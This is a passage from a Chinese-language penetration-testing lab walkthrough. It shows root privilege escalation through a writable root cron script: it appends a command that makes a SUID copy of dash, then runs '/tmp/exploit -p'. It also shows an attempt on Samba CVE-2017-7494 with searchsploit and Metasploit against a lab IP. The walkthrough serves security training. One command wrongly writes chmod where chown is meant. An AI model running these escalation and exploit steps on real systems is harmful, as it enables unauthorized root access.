![1662181408_6312e020689545ae76a39.png!small?1662181408878](https://image.3001.net/images/20220903/1662181408_6312e020689545ae76a39.png!small?1662181408878)

可以执行所有的命令，那就直接

    
    
    sudo su

直接拿root权限

![1662181412_6312e024c41a66f2a181e.png!small?1662181413185](https://image.3001.net/images/20220903/1662181412_6312e024c41a66f2a181e.png!small?1662181413185)

#### 计划任务写入文件提权

接下来看

  1. path： 可被写入

You can write script: /usr/local/sbin/cron-logrotate.sh

/usr/local/sbin/cron-logrotate.sh

    
    
    find / -name logrotate* 2>/dev/null

查找logrotate，并且隐藏报错信息

cron就是Linux中的计划任务目录

windows在控制面版中

我们看一下在计划任务目录下的这个文件

    
    
    cat /etc/cron.d/logrotate

![1662181420_6312e02cd5ae944e8fd63.png!small?1662181421192](https://image.3001.net/images/20220903/1662181420_6312e02cd5ae944e8fd63.png!small?1662181421192)

每五分钟执行一次这个脚本，可以在菜鸟教程中找到cron计划任务，有详细解释

![1662181444_6312e044d9b4348539860.png!small?1662181445537](https://image.3001.net/images/20220903/1662181444_6312e044d9b4348539860.png!small?1662181445537)

我们查看一下他是以什么权限运行的

    
    
    ls -la /usr/local/sbin/cron-logrotate.sh

![1662181449_6312e049d736a7bd480c6.png!small?1662181450515](https://image.3001.net/images/20220903/1662181449_6312e049d736a7bd480c6.png!small?1662181450515)

是以root权限运行的

我们可以往进写东西

    
    
    echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit" >> /usr/local/sbin/cron-logrotate.sh

将/bin下的shell dash，复制到tmp下为exploit，给这个文件最高权限，然后写入，等五分钟自动执行

![1662181453_6312e04d84068351a437e.png!small?1662181454055](https://image.3001.net/images/20220903/1662181453_6312e04d84068351a437e.png!small?1662181454055)

    
    
    /tmp/exploit -p

![1662181457_6312e051c34f9fa248fa8.png!small?1662181458159](https://image.3001.net/images/20220903/1662181457_6312e051c34f9fa248fa8.png!small?1662181458159)

提权成功

### 14、sambacry 拿shell ---利用随机化！linux的永恒之蓝

前面nmap扫出了信息：

139/tcp open netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)

    
    
    searchsploit Samba 4.3.9  
    locate linux/remote/42084.rb  
    -      cp /usr/share/exploitdb/exploits/linux/remote/42084.rb .

这是CVE-2017-7494的漏洞！<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7494>

MSF可以利用！

    
    
    msfconsole

`search Samba`\---符合2017年的就几个

    
    
    use exploit/linux/samba/is_known_pipename  
    set rhosts 192.168.27.191  
    set rport 139  
    run

利用失败了但是

<https://github.com/joxeankoret/CVE-2017-7494/>

proxychains git clone <https://github.com/opsxcq/exploit-CVE-2017-7494.git>

## 总结

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到内核提权项目落地，学习到了非常多的技巧，例如nmap全端口信息枚举、wordpress后台getshell的几种方式、数据库枚举、ssh，ftp暴力破解、内部信息枚举、提权等等，希望伙伴们能实际操作复现一遍，不要眼高手低！巩固自身的渗透技术和技巧！

最后

希望大家提高安全意识，没有网络安全就没有国家安全！

  

